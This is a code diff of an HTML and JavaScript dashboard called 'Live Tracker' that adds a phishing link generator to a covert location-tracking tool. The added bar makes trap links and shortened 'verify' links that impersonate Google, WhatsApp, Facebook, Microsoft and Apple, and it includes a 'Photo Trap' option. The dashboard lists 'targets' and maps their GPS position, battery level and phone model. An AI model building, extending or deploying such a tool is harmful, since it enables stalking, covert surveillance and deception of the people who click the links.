@@ -7,28 +7,36 @@
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style>
+        /* ===== RESET & BASE ===== */
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif; background: #0f0f1a; color: #e0e0e0; height: 100vh; overflow: hidden; }
+        body {
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #0f0f1a;
+            color: #e0e0e0;
+            height: 100vh;
+            overflow: hidden;
+        }
 
+        /* ===== TOP BAR ===== */
         #topBar {
             background: #1a1a2e;
-            padding: 12px 24px;
+            padding: 10px 20px;
             display: flex;
             justify-content: space-between;
             align-items: center;
             border-bottom: 1px solid #2a2a4a;
-            z-index: 1000;
-            position: relative;
             flex-wrap: wrap;
             gap: 8px;
+            z-index: 1001;
+            position: relative;
         }
         #topBar .brand {
             display: flex;
             align-items: center;
-            gap: 12px;
+            gap: 10px;
         }
         #topBar .brand h1 {
-            font-size: 20px;
+            font-size: 18px;
             font-weight: 700;
             background: linear-gradient(135deg, #e94560, #ff6b6b);
             -webkit-background-clip: text;
@@ -36,78 +44,147 @@
         }
         #topBar .brand .badge {
             background: #2a2a4a;
-            padding: 4px 12px;
+            padding: 2px 10px;
             border-radius: 20px;
-            font-size: 12px;
+            font-size: 11px;
             color: #4caf50;
         }
         #topBar .stats {
             display: flex;
-            gap: 24px;
-            font-size: 13px;
+            gap: 18px;
+            font-size: 12px;
         }
-        #topBar .stats span { opacity: 0.7; }
+        #topBar .stats span { opacity: 0.6; }
         #topBar .stats strong { color: #fff; font-weight: 600; }
 
+        /* ===== LINK GENERATOR BAR ===== */
+        #linkBar {
+            background: #141425;
+            padding: 8px 20px;
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            gap: 8px 12px;
+            border-bottom: 1px solid #2a2a4a;
+            z-index: 1000;
+            position: relative;
+        }
+        #linkBar label {
+            font-size: 12px;
+            opacity: 0.6;
+        }
+        #linkBar select {
+            background: #0f0f1a;
+            color: white;
+            border: 1px solid #2a2a4a;
+            padding: 4px 10px;
+            border-radius: 4px;
+            font-size: 12px;
+            cursor: pointer;
+        }
+        #linkBar select:hover { border-color: #4caf50; }
+        #linkBar .link-display {
+            background: #0f0f1a;
+            padding: 4px 10px;
+            border-radius: 4px;
+            font-family: monospace;
+            font-size: 11px;
+            word-break: break-all;
+            flex: 1;
+            min-width: 150px;
+            color: #4caf50;
+            border: 1px solid #1e1e38;
+        }
+        #linkBar .btn {
+            background: #4caf50;
+            color: white;
+            border: none;
+            padding: 4px 14px;
+            border-radius: 4px;
+            font-size: 12px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: background 0.2s;
+        }
+        #linkBar .btn:hover { background: #388e3c; }
+        #linkBar .btn-blue { background: #4285f4; }
+        #linkBar .btn-blue:hover { background: #3367d6; }
+        #linkBar .short-link {
+            color: #ffc107;
+            font-size: 12px;
+            font-family: monospace;
+            background: #0f0f1a;
+            padding: 4px 10px;
+            border-radius: 4px;
+            border: 1px solid #1e1e38;
+        }
+        #linkBar .divider {
+            width: 1px;
+            height: 24px;
+            background: #2a2a4a;
+        }
+
+        /* ===== APP LAYOUT ===== */
         #app {
             display: flex;
-            height: calc(100vh - 68px);
+            height: calc(100vh - 120px);
             width: 100vw;
         }
 
+        /* ===== SIDEBAR ===== */
         #sidebar {
-            width: 320px;
-            min-width: 280px;
+            width: 280px;
+            min-width: 220px;
             background: #141425;
             border-right: 1px solid #2a2a4a;
             display: flex;
             flex-direction: column;
             overflow: hidden;
-            transition: width 0.3s;
         }
         #sidebar .header {
-            padding: 16px 20px;
+            padding: 12px 16px;
             border-bottom: 1px solid #2a2a4a;
             font-weight: 600;
-            font-size: 14px;
+            font-size: 13px;
             display: flex;
             justify-content: space-between;
             align-items: center;
+            flex-shrink: 0;
         }
         #sidebar .header .count {
             background: #2a2a4a;
             padding: 2px 10px;
             border-radius: 20px;
-            font-size: 12px;
+            font-size: 11px;
             color: #4caf50;
         }
         #userList {
             flex: 1;
             overflow-y: auto;
-            padding: 8px 0;
+            padding: 4px 0;
         }
         #userList::-webkit-scrollbar { width: 4px; }
         #userList::-webkit-scrollbar-thumb { background: #2a2a4a; border-radius: 4px; }
         .user-item {
-            padding: 12px 20px;
+            padding: 10px 16px;
             border-bottom: 1px solid #1e1e38;
             cursor: pointer;
             transition: all 0.2s;
             display: flex;
             align-items: center;
-            gap: 12px;
+            gap: 10px;
         }
         .user-item:hover { background: #1e1e3a; }
         .user-item.active { background: #2a2a5a; border-left: 3px solid #4caf50; }
         .user-item .avatar {
-            width: 36px;
-            height: 36px;
+            width: 32px;
+            height: 32px;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
             font-weight: 700;
-            font-size: 14px;
+            font-size: 12px;
             color: #fff;
             flex-shrink: 0;
         }
@@ -116,32 +193,33 @@
             min-width: 0;
         }
         .user-item .info .name {
-            font-size: 14px;
+            font-size: 13px;
             font-weight: 500;
             color: #fff;
         }
         .user-item .info .device {
-            font-size: 12px;
-            opacity: 0.6;
-            margin-top: 2px;
+            font-size: 11px;
+            opacity: 0.5;
+            margin-top: 1px;
             white-space: nowrap;
             overflow: hidden;
             text-overflow: ellipsis;
         }
         .user-item .info .last-seen {
-            font-size: 11px;
-            opacity: 0.4;
-            margin-top: 2px;
+            font-size: 10px;
+            opacity: 0.3;
+            margin-top: 1px;
         }
         .user-item .status-dot {
-            width: 10px;
-            height: 10px;
+            width: 8px;
+            height: 8px;
             border-radius: 50%;
             flex-shrink: 0;
         }
         .user-item .status-dot.online { background: #4caf50; box-shadow: 0 0 8px #4caf50; }
-        .user-item .status-dot.offline { background: #666; }
+        .user-item .status-dot.offline { background: #555; }
 
+        /* ===== MAP ===== */
         #mapContainer {
             flex: 1;
             position: relative;
@@ -152,6 +230,7 @@
             height: 100%;
         }
 
+        /* ===== EMPTY STATE ===== */
         #emptyState {
             position: absolute;
             top: 50%;
@@ -162,15 +241,22 @@
             pointer-events: none;
             z-index: 10;
         }
-        #emptyState .icon { font-size: 48px; margin-bottom: 12px; }
-        #emptyState .title { font-size: 20px; font-weight: 600; color: #aaa; }
-        #emptyState .sub { font-size: 14px; margin-top: 8px; opacity: 0.6; }
+        #emptyState .icon { font-size: 40px; margin-bottom: 8px; }
+        #emptyState .title { font-size: 18px; font-weight: 600; color: #aaa; }
+        #emptyState .sub { font-size: 13px; margin-top: 6px; opacity: 0.5; }
 
+        /* ===== RESPONSIVE ===== */
         @media (max-width: 768px) {
-            #sidebar { width: 100%; height: 45%; border-right: none; border-bottom: 1px solid #2a2a4a; }
+            #sidebar {
+                width: 100%;
+                height: 40%;
+                border-right: none;
+                border-bottom: 1px solid #2a2a4a;
+            }
             #app { flex-direction: column; }
-            #mapContainer { height: 55%; }
+            #mapContainer { height: 60%; }
             #topBar .stats { display: none; }
+            #linkBar .link-display { min-width: 100px; font-size: 10px; }
         }
         ::-webkit-scrollbar { width: 4px; }
         ::-webkit-scrollbar-track { background: #0f0f1a; }
@@ -179,7 +265,7 @@
 </head>
 <body>
 
-<!-- TOP BAR -->
+<!-- ===== TOP BAR ===== -->
 <div id="topBar">
     <div class="brand">
         <h1>📍 Live Tracker</h1>
@@ -192,21 +278,56 @@
     </div>
 </div>
 
-<!-- APP -->
+<!-- ===== LINK GENERATOR BAR ===== -->
+<div id="linkBar">
+    <label>📤 Send:</label>
+    <select id="brandSelect">
+        <option value="google">🔵 Google</option>
+        <option value="whatsapp" selected>💬 WhatsApp</option>
+        <option value="facebook">🔷 Facebook</option>
+        <option value="microsoft">⬡ Microsoft</option>
+        <option value="apple"> Apple</option>
+    </select>
+
+    <div class="divider"></div>
+
+    <label>📸 Photo Trap:</label>
+    <select id="photoTemplateSelect">
+        <option value="google">🔵 Google</option>
+        <option value="whatsapp" selected>💬 WhatsApp</option>
+        <option value="facebook">🔷 Facebook</option>
+        <option value="microsoft">⬡ Microsoft</option>
+        <option value="apple"> Apple</option>
+    </select>
+
+    <div class="divider"></div>
+
+    <span class="link-display" id="linkDisplay">https://location-tracker-cn7m.onrender.com/?template=whatsapp</span>
+    <button class="btn" id="copyLinkBtn">📋 Copy</button>
+
+    <span class="short-link" id="shortLinkDisplay">rebrand.ly/verify-wa</span>
+</div>
+
+<!-- ===== APP ===== -->
 <div id="app">
+    <!-- SIDEBAR -->
     <div id="sidebar">
         <div class="header">
             <span>📋 Users</span>
             <span class="count" id="userBadge">0</span>
         </div>
-        <div id="userList"></div>
+        <div id="userList">
+            <div style="padding:20px;text-align:center;opacity:0.4;font-size:14px;">No users yet</div>
+        </div>
     </div>
+
+    <!-- MAP -->
     <div id="mapContainer">
         <div id="map"></div>
         <div id="emptyState">
             <div class="icon">🕵️</div>
             <div class="title">No targets yet</div>
-            <div class="sub">Share your trap link to start tracking</div>
+            <div class="sub">Send a link above to start tracking</div>
         </div>
     </div>
 </div>
@@ -217,6 +338,59 @@
     // =============================================
     const RENDER_URL = '';
     const BASE_URL = 'https://location-tracker-cn7m.onrender.com';
+
+    const SHORT_LINKS = {
+        google: 'rebrand.ly/verify-google',
+        whatsapp: 'rebrand.ly/verify-wa',
+        facebook: 'rebrand.ly/verify-FACEBOOK',
+        microsoft: 'rebrand.ly/verify-ms',
+        apple: 'rebrand.ly/apple-security'
+    };
+
+    // =============================================
+    // DOM ELEMENTS — Link Generator
+    // =============================================
+    const brandSelect = document.getElementById('brandSelect');
+    const photoTemplateSelect = document.getElementById('photoTemplateSelect');
+    const linkDisplay = document.getElementById('linkDisplay');
+    const shortLinkDisplay = document.getElementById('shortLinkDisplay');
+    const copyLinkBtn = document.getElementById('copyLinkBtn');
+
+    function updateLink() {
+        const brand = brandSelect.value;
+        const fullUrl = BASE_URL + '/?template=' + brand;
+        const shortUrl = SHORT_LINKS[brand] || '';
+        linkDisplay.textContent = fullUrl;
+        shortLinkDisplay.textContent = shortUrl;
+    }
+
+    brandSelect.addEventListener('change', updateLink);
+    photoTemplateSelect.addEventListener('change', function() {
+        // Update photo trap link if needed
+    });
+    updateLink();
+
+    copyLinkBtn.addEventListener('click', function() {
+        const link = linkDisplay.textContent;
+        navigator.clipboard.writeText(link).then(() => {
+            const originalText = copyLinkBtn.textContent;
+            copyLinkBtn.textContent = '✅ Copied!';
+            setTimeout(() => {
+                copyLinkBtn.textContent = originalText;
+            }, 2000);
+        }).catch(() => {
+            const range = document.createRange();
+            range.selectNode(linkDisplay);
+            window.getSelection().removeAllRanges();
+            window.getSelection().addRange(range);
+            document.execCommand('copy');
+            const originalText = copyLinkBtn.textContent;
+            copyLinkBtn.textContent = '✅ Copied!';
+            setTimeout(() => {
+                copyLinkBtn.textContent = originalText;
+            }, 2000);
+        });
+    });
 
     // =============================================
     // MAP SETUP
@@ -234,7 +408,7 @@
     function getColor() { return colorPalette[colorIndex++ % colorPalette.length]; }
 
     // =============================================
-    // COMPREHENSIVE DEVICE DETECTION
+    // DEVICE DETECTION
     // =============================================
     function getDeviceModel(userAgent) {
         if (!userAgent) return 'Unknown Device';
@@ -276,37 +450,26 @@
             if (ua.includes('iPhone7,1')) return 'iPhone 6 Plus';
             if (ua.includes('iPhone7,2')) return 'iPhone 6';
             if (ua.includes('iPhone SE')) return 'iPhone SE';
-            const gen = ua.match(/iPhone(\d+,\d+)/);
-            if (gen) return 'iPhone (' + gen[1] + ')';
             return 'iPhone';
         }
 
-        // --- iPad ---
-        if (ua.includes('iPad')) return 'iPad';
-
         // --- Samsung Galaxy ---
         if (ua.includes('Samsung') || ua.includes('SM-')) {
-            // Galaxy S25
             if (ua.includes('SM-S931')) return 'Samsung Galaxy S25';
             if (ua.includes('SM-S936')) return 'Samsung Galaxy S25+';
             if (ua.includes('SM-S938')) return 'Samsung Galaxy S25 Ultra';
-            // Galaxy S24
             if (ua.includes('SM-S921')) return 'Samsung Galaxy S24';
             if (ua.includes('SM-S926')) return 'Samsung Galaxy S24+';
             if (ua.includes('SM-S928')) return 'Samsung Galaxy S24 Ultra';
-            // Galaxy S23
             if (ua.includes('SM-S911')) return 'Samsung Galaxy S23';
             if (ua.includes('SM-S916')) return 'Samsung Galaxy S23+';
             if (ua.includes('SM-S918')) return 'Samsung Galaxy S23 Ultra';
-            // Galaxy S22
             if (ua.includes('SM-S901')) return 'Samsung Galaxy S22';
             if (ua.includes('SM-S906')) return 'Samsung Galaxy S22+';
             if (ua.includes('SM-S908')) return 'Samsung Galaxy S22 Ultra';
-            // Galaxy S21
             if (ua.includes('SM-G991')) return 'Samsung Galaxy S21';
             if (ua.includes('SM-G996')) return 'Samsung Galaxy S21+';
             if (ua.includes('SM-G998')) return 'Samsung Galaxy S21 Ultra';
-            // Galaxy Z Fold/Flip
             if (ua.includes('SM-F956')) return 'Samsung Galaxy Z Fold6';
             if (ua.includes('SM-F946')) return 'Samsung Galaxy Z Fold5';
             if (ua.includes('SM-F936')) return 'Samsung Galaxy Z Fold4';
@@ -315,23 +478,12 @@
             if (ua.includes('SM-F731')) return 'Samsung Galaxy Z Flip5';
             if (ua.includes('SM-F721')) return 'Samsung Galaxy Z Flip4';
             if (ua.includes('SM-F711')) return 'Samsung Galaxy Z Flip3';
-            // Galaxy A Series
             if (ua.includes('SM-A556')) return 'Samsung Galaxy A55';
             if (ua.includes('SM-A546')) return 'Samsung Galaxy A54';
             if (ua.includes('SM-A536')) return 'Samsung Galaxy A53';
             if (ua.includes('SM-A526')) return 'Samsung Galaxy A52';
-            if (ua.includes('SM-A346')) return 'Samsung Galaxy A34';
-            if (ua.includes('SM-A336')) return 'Samsung Galaxy A33';
-            if (ua.includes('SM-A256')) return 'Samsung Galaxy A25';
-            if (ua.includes('SM-A156')) return 'Samsung Galaxy A15';
-            // Galaxy Note
             if (ua.includes('SM-N986')) return 'Samsung Galaxy Note 20 Ultra';
             if (ua.includes('SM-N981')) return 'Samsung Galaxy Note 20';
-            if (ua.includes('SM-N975')) return 'Samsung Galaxy Note 10+';
-            if (ua.includes('SM-N970')) return 'Samsung Galaxy Note 10';
-            // Fallback
-            const smMatch = ua.match(/SM-([A-Z0-9]+)/);
-            if (smMatch) return 'Samsung Galaxy (' + smMatch[1] + ')';
             return 'Samsung Galaxy';
         }
 
@@ -343,9 +495,6 @@
             if (ua.includes('Pixel 6')) return 'Google Pixel 6';
             if (ua.includes('Pixel 5')) return 'Google Pixel 5';
             if (ua.includes('Pixel 4')) return 'Google Pixel 4';
-            if (ua.includes('Pixel 3')) return 'Google Pixel 3';
-            const pMatch = ua.match(/Pixel (\d+)/);
-            if (pMatch) return 'Google Pixel ' + pMatch[1];
             return 'Google Pixel';
         }
 
@@ -354,18 +503,11 @@
             if (ua.includes('Xiaomi 14')) return 'Xiaomi 14';
             if (ua.includes('Xiaomi 13')) return 'Xiaomi 13';
             if (ua.includes('Xiaomi 12')) return 'Xiaomi 12';
-            if (ua.includes('Xiaomi 11')) return 'Xiaomi 11';
             if (ua.includes('Redmi Note 13')) return 'Redmi Note 13';
             if (ua.includes('Redmi Note 12')) return 'Redmi Note 12';
             if (ua.includes('Redmi Note 11')) return 'Redmi Note 11';
-            if (ua.includes('Redmi 13')) return 'Redmi 13';
-            if (ua.includes('Redmi 12')) return 'Redmi 12';
             if (ua.includes('POCO X6')) return 'POCO X6';
-            if (ua.includes('POCO X5')) return 'POCO X5';
             if (ua.includes('POCO F5')) return 'POCO F5';
-            if (ua.includes('POCO F4')) return 'POCO F4';
-            const xMatch = ua.match(/M([0-9]{4})/);
-            if (xMatch) return 'Xiaomi (' + xMatch[1] + ')';
             return 'Xiaomi';
         }
 
@@ -375,101 +517,17 @@
             if (ua.includes('OnePlus 11')) return 'OnePlus 11';
             if (ua.includes('OnePlus 10')) return 'OnePlus 10';
             if (ua.includes('OnePlus 9')) return 'OnePlus 9';
-            if (ua.includes('OnePlus 8')) return 'OnePlus 8';
-            if (ua.includes('OnePlus Nord')) return 'OnePlus Nord';
             return 'OnePlus';
         }
 
-        // --- Oppo ---
-        if (ua.includes('Oppo')) {
-            if (ua.includes('Find X')) return 'Oppo Find X';
-            if (ua.includes('Reno')) return 'Oppo Reno';
-            return 'Oppo';
-        }
-
-        // --- Vivo ---
-        if (ua.includes('Vivo')) {
-            return 'Vivo';
-        }
-
-        // --- Realme ---
-        if (ua.includes('Realme')) {
-            return 'Realme';
-        }
-
-        // --- Huawei ---
-        if (ua.includes('Huawei')) {
-            if (ua.includes('P60')) return 'Huawei P60';
-            if (ua.includes('P50')) return 'Huawei P50';
-            if (ua.includes('P40')) return 'Huawei P40';
-            if (ua.includes('Mate 60')) return 'Huawei Mate 60';
-            if (ua.includes('Mate 50')) return 'Huawei Mate 50';
-            if (ua.includes('Mate 40')) return 'Huawei Mate 40';
-            return 'Huawei';
-        }
-
-        // --- Honor ---
-        if (ua.includes('Honor')) {
-            if (ua.includes('Magic 6')) return 'Honor Magic 6';
-            if (ua.includes('Magic 5')) return 'Honor Magic 5';
-            if (ua.includes('Magic 4')) return 'Honor Magic 4';
-            return 'Honor';
-        }
-
-        // --- Nothing ---
-        if (ua.includes('Nothing')) {
-            if (ua.includes('Phone (2)')) return 'Nothing Phone (2)';
-            if (ua.includes('Phone (1)')) return 'Nothing Phone (1)';
-            return 'Nothing Phone';
-        }
-
-        // --- Sony Xperia ---
-        if (ua.includes('Sony') || ua.includes('Xperia')) {
-            if (ua.includes('Xperia 1')) return 'Sony Xperia 1';
-            if (ua.includes('Xperia 5')) return 'Sony Xperia 5';
-            if (ua.includes('Xperia 10')) return 'Sony Xperia 10';
-            return 'Sony Xperia';
-        }
-
-        // --- LG ---
-        if (ua.includes('LG')) {
-            return 'LG';
-        }
-
-        // --- Motorola ---
-        if (ua.includes('Moto') || ua.includes('Motorola')) {
-            if (ua.includes('Moto G')) return 'Motorola Moto G';
-            if (ua.includes('Moto E')) return 'Motorola Moto E';
-            if (ua.includes('Edge')) return 'Motorola Edge';
-            return 'Motorola';
-        }
-
-        // --- Asus ROG ---
-        if (ua.includes('ASUS') && ua.includes('ROG')) {
-            return 'Asus ROG Phone';
-        }
-        if (ua.includes('ASUS')) {
-            return 'Asus';
-        }
-
-        // --- Nokia ---
-        if (ua.includes('Nokia')) {
-            return 'Nokia';
-        }
-
-        // --- OnePlus (fallback) ---
-        if (ua.includes('OnePlus')) return 'OnePlus';
-
-        // --- Generic Android ---
+        // --- Other Android ---
         if (ua.includes('Android')) {
             const ver = ua.match(/Android\s([\d.]+)/);
             return 'Android ' + (ver ? ver[1] : '');
         }
 
-        // --- Windows / Mac ---
         if (ua.includes('Windows')) return 'Windows PC';
         if (ua.includes('Mac')) return 'Mac';
-
         return 'Unknown Device';
     }
 
@@ -478,7 +536,6 @@
             model: getDeviceModel(userAgent),
             os: userAgent.includes('Android') ? 'Android' :
                 userAgent.includes('iPhone') ? 'iOS' :
-                userAgent.includes('iPad') ? 'iPadOS' :
                 userAgent.includes('Windows') ? 'Windows' :
                 userAgent.includes('Mac') ? 'macOS' : 'Unknown'
         };
@@ -503,7 +560,7 @@
         document.getElementById('emptyState').style.display = 'none';
 
         let html = '';
-        users.forEach((u, idx) => {
+        users.forEach((u) => {
             const sid = u.session_id || 'unknown';
             const lat = u.lat;
             const lng = u.lng;
@@ -552,7 +609,10 @@
     // =============================================
     function fetchUsers() {
         fetch(RENDER_URL + '/get-users')
-            .then(res => res.json())
+            .then(res => {
+                if (!res.ok) throw new Error('Server error');
+                return res.json();
+            })
             .then(users => {
                 renderUsers(users);
                 updateMarkers(users);
@@ -560,7 +620,7 @@
             })
             .catch(err => {
                 console.error('Fetch error:', err);
-                document.getElementById('userList').innerHTML = `<div style="padding:20px;text-align:center;color:#e94560;">⚠️ Connection error</div>`;
+                document.getElementById('userList').innerHTML = `<div style="padding:20px;text-align:center;color:#e94560;font-size:13px;">⚠️ Connection error</div>`;
             });
     }
 
@@ -594,22 +654,21 @@
                 const m = markers[sid];
                 if (!m.marker) {
                     const icon = L.divIcon({
-                        html: `<div style="background:${m.color};width:16px;height:16px;border-radius:50%;border:3px solid white;box-shadow:0 2px 10px rgba(0,0,0,0.5);"></div>`,
+                        html: `<div style="background:${m.color};width:14px;height:14px;border-radius:50%;border:2px solid white;box-shadow:0 2px 10px rgba(0,0,0,0.5);"></div>`,
                         className: '',
-                        iconSize: [16,16],
-                        iconAnchor: [8,8]
+                        iconSize: [14,14],
+                        iconAnchor: [7,7]
                     });
                     m.marker = L.marker([lat, lng], { icon }).addTo(map);
                     const deviceInfo = u.device_info ? getDeviceInfo(u.device_info.userAgent || '') : { model: 'Unknown', os: 'Unknown' };
-                    const popupContent = `
+                    m.marker.bindPopup(`
                         <b>📱 ${deviceInfo.model}</b><br>
                         <b>OS:</b> ${deviceInfo.os}<br>
                         <b>📍</b> ${lat.toFixed(5)}, ${lng.toFixed(5)}<br>
                         <b>🎯 Accuracy:</b> ${u.accuracy ? u.accuracy.toFixed(0) + 'm' : '--'}<br>
                         <b>🔋 Battery:</b> ${u.battery ? u.battery.level + '%' : '--'}<br>
-                        <b>🕐 Last update:</b> ${u.timestamp ? new Date(u.timestamp).toLocaleString() : '--'}
-                    `;
-                    m.marker.bindPopup(popupContent);
+                        <b>🕐</b> ${u.timestamp ? new Date(u.timestamp).toLocaleString() : '--'}
+                    `);
                 } else {
                     m.marker.setLatLng([lat, lng]);
                 }
@@ -669,7 +728,7 @@
         document.getElementById('locationCount').textContent = users.length;
 
         if (users.length > 0) {
-            const latest = users.reduce((a,b) => a.timestamp > b.timestamp ? a : b);
+            const latest = users.reduce((a, b) => a.timestamp > b.timestamp ? a : b);
             document.getElementById('lastUpdate').textContent = latest.timestamp ? new Date(latest.timestamp).toLocaleTimeString() : '--';
         } else {
             document.getElementById('lastUpdate').textContent = '--';
@@ -682,10 +741,12 @@
     setInterval(fetchUsers, 3000);
     fetchUsers();
 
+    // Handle resize
     window.addEventListener('resize', () => setTimeout(() => map.invalidateSize(), 200));
     setTimeout(() => map.invalidateSize(), 500);
 
-    console.log('📍 Professional Dashboard initialized with comprehensive device detection');
+    console.log('📍 Dashboard initialized');
+    console.log('🔗 Links available in the bar above');
 </script>
 </body>
 </html>
